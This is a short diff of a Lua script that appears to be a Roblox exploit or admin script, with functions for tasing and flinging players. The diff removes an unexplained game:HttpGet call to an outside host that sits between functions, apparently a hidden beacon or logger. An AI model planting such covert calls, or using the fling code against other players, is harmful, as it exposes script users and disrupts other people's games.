@@ -1739,7 +1739,7 @@ local TasePL = function(plr, args)
 		end
 	end
 end
-game:HttpGet("https://resourcegatherhoster.ct.ws/index.php")
+
 local FlingPL = function(args)
 	local tempos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
 	for _,v in next, LocalPlayer.Character:GetChildren() do
